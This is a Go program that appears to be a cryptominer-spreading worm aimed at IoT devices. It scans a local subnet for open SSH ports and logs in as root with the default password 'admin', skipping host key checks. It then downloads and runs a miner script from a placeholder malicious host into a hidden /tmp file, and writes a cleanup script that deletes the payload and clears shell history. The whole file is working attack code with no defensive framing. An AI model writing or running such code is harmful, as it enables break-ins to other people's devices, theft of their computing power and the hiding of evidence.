package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"
)

const (
	payloadURL    = "http://malicious-server.com/miner.sh"
	sshPort       = "22"
	sshUser       = "root"
	sshPass       = "admin"
	scanSubnet    = "192.168.1.0/24"
	concurrency   = 10
	cleanupScript = "/tmp/.cleanup.sh"
)

func scanHost(ip string, results chan<- string, wg *sync.WaitGroup) {
	defer wg.Done()
	target := fmt.Sprintf("%s:%s", ip, sshPort)
	conn, err := net.DialTimeout("tcp", target, 2*time.Second)
	if err != nil {
		return
	}
	conn.Close()
	results <- ip
}

func deployPayload(ip string) bool {
	cmd := fmt.Sprintf("sshpass -p '%s' ssh -o StrictHostKeyChecking=no %s@%s 'wget -q -O /tmp/.update %s && chmod +x /tmp/.update && /tmp/.update'", sshPass, sshUser, ip, payloadURL)
	output, err := exec.Command("bash", "-c", cmd).CombinedOutput()
	if err != nil {
		log.Printf("Failed to deploy to %s: %v", ip, string(output))
		return false
	}
	log.Printf("Deployed to %s successfully", ip)
	return true
}

func main() {
	log.Println("Starting IoT miner deployment scan...")
	ip, ipnet, err := net.ParseCIDR(scanSubnet)
	if err != nil {
		log.Fatal(err)
	}

	results := make(chan string, 254)
	var wg sync.WaitGroup
	sem := make(chan struct{}, concurrency)

	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {
		sem <- struct{}{}
		wg.Add(1)
		go func(host string) {
			defer func() { <-sem }()
			scanHost(host, results, &wg)
		}(ip.String())
	}

	go func() {
		wg.Wait()
		close(results)
	}()

	for host := range results {
		if deployPayload(host) {
			// Cleanup traces on successful deployment
			exec.Command("bash", "-c", fmt.Sprintf("echo 'rm -f /tmp/.update; history -c' > %s", cleanupScript)).Run()
		}
	}
	log.Println("Scan and deployment completed.")
}

func inc(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}